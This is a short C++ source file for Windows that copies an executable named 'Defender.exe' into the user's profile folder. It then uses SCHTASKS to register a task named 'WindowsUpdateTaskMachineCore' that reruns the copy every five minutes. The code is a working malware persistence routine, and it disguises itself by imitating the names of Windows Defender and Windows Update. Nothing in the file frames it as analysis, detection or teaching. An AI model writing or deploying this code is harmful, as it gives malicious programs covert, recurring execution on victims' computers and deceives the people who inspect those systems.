#include <iostream>
#include <windows.h>
#include <ctime>
#include <sstream>
#include <iomanip>

std::string getEndTime() {
    time_t now = time(nullptr);
    struct tm currentTime;
    localtime_s(&currentTime, &now);

    // Calculate the end time (5 hours from now)
    currentTime.tm_hour += 5;
    mktime(&currentTime);

    std::ostringstream oss;
    oss << std::setfill('0') << std::setw(2) << currentTime.tm_hour << ":";
    oss << std::setfill('0') << std::setw(2) << currentTime.tm_min;

    return oss.str();
}

int move_and_schedule() {
    const char* sourceFileName = "Defender.exe";
    const char* destinationFolderPath = getenv("USERPROFILE");
    std::string endTime = getEndTime();

    std::string destinationFilePath = destinationFolderPath;
    destinationFilePath += "\\";
    destinationFilePath += sourceFileName;

    if (!CopyFileA(sourceFileName, destinationFilePath.c_str(), FALSE)) {
        return 1;
    }

    char command[512];
    snprintf(command, sizeof(command), "SCHTASKS /Create /SC MINUTE /MO 5 /TN WindowsUpdateTaskMachineCore /TR \"%s\\%s\" /ET %s", destinationFolderPath, sourceFileName, endTime.c_str());
    
    int result = system(command);

    return (result == 0) ? 0 : 1;
}

int main() {
    move_and_schedule();
    return 0;
}
